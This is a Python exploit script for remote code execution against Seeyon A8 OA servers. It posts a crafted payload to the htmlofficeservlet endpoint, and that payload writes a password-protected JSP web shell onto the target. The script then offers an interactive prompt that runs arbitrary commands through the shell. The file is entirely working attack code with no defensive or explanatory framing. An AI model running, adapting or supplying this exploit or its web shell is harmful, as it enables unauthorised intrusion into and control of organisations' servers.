#!/usr/bin/env python
# / -*- coding:utf-8 -*-
# author:ray
# date:2019-6-26

import sys
import requests
import re

payload = "DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV"
payload += "OPTION=S3WYOSWLBSGr"
payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66"
payload += "CREATEDATE=wUghPB3szB3Xwg66"
payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6"
payload += "originalFileId=wV66"
payload += "originalCreateDate=wUghPB3szB3Xwg66"
payload += "FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6"
payload += "needReadFile=yRWZdAS6"
payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66"
payload += "<%@ page language='java' import='java.util.*,java.io.*'' pageEncoding='UTF-8'%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+'\n');}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if('asasd3344'.equals(request.getParameter('pwd'))&&!''.equals(request.getParameter('cmd'))){out.println('<pre>'+excuteCmd(request.getParameter('cmd')) + '</pre>');}else{out.println(':-)');}%>6e4f045d4b8506bf492ada7e3390d7ce"


def post(url):
    url1 = url + "/seeyon/htmlofficeservlet"
    header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0',
              'Pragma': 'no-cache', 'Content-Length': '1121'}
    request = requests.post(url1, data=payload, headers=header)

def get(url,cmd):

    url2 = url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd+/c+%s" % cmd

    request = requests.get(url2)
    response = request.text
    reg = re.compile('<[^>]*>')
    content = reg.sub('',response).replace(' ','')
    return content
    

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print "Usage: python A8-OA-seeyon-RCE.py url"
    else:
        print "----------------------------------------"
        print "|                                      |"
        print "|         A8-OA-seeyon-RCE             |"
        print "|                                      |"
        print "|                       author by ray  |"
        print "----------------------------------------"
        print 
    url = sys.argv[1]
    post(url)
    while True:
        cmd = raw_input("Command: ")
        print
        print get(url,cmd)



